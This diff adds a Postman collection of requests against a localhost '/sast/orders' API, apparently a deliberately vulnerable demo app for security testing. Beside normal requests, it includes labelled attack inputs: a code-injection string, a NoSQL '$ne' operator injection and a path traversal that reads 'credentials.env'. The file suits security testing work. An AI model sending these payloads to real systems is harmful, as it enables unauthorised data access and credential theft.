@@ -1,0 +1,198 @@
+{
+	"info": {
+		"_postman_id": "b558c7b0-f7f2-4386-aaea-0fba51bd32b1",
+		"name": "T3100",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Post Orders",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "",
+					"options": {
+						"raw": {
+							"language": "text"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://localhost:8090/rest/api/v1/sast/orders",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8090",
+					"path": [
+						"rest",
+						"api",
+						"v1",
+						"sast",
+						"orders"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Get Orders",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8090/rest/api/v1/sast/orders?username=admin&orderNumber=kldjkdfjkdf",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8090",
+					"path": [
+						"rest",
+						"api",
+						"v1",
+						"sast",
+						"orders"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "admin"
+						},
+						{
+							"key": "orderNumber",
+							"value": "kldjkdfjkdf"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Get Orders (Code Injection)",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8090/rest/api/v1/sast/orders?username=admin&orderNumber=' || !'",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8090",
+					"path": [
+						"rest",
+						"api",
+						"v1",
+						"sast",
+						"orders"
+					],
+					"query": [
+						{
+							"key": "username",
+							"value": "admin"
+						},
+						{
+							"key": "orderNumber",
+							"value": "' || !'"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Get Orders 2 (Code Injection)",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8090/rest/api/v1/sast/orders2?username[$ne]=bar&orderNumber[$ne]=bar",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8090",
+					"path": [
+						"rest",
+						"api",
+						"v1",
+						"sast",
+						"orders2"
+					],
+					"query": [
+						{
+							"key": "username[$ne]",
+							"value": "bar"
+						},
+						{
+							"key": "orderNumber[$ne]",
+							"value": "bar"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Get Order-PDF",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8090/rest/api/v1/sast/order?pdfName=f2e71bcb-152e-4a23-ab72-6d7f6022ed60.pdf",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8090",
+					"path": [
+						"rest",
+						"api",
+						"v1",
+						"sast",
+						"order"
+					],
+					"query": [
+						{
+							"key": "pdfName",
+							"value": "f2e71bcb-152e-4a23-ab72-6d7f6022ed60.pdf"
+						}
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Get Order-PDF (Path Traversal)",
+			"request": {
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8090/rest/api/v1/sast/order?pdfName=../../../credentials.env",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8090",
+					"path": [
+						"rest",
+						"api",
+						"v1",
+						"sast",
+						"order"
+					],
+					"query": [
+						{
+							"key": "pdfName",
+							"value": "../../../credentials.env"
+						}
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
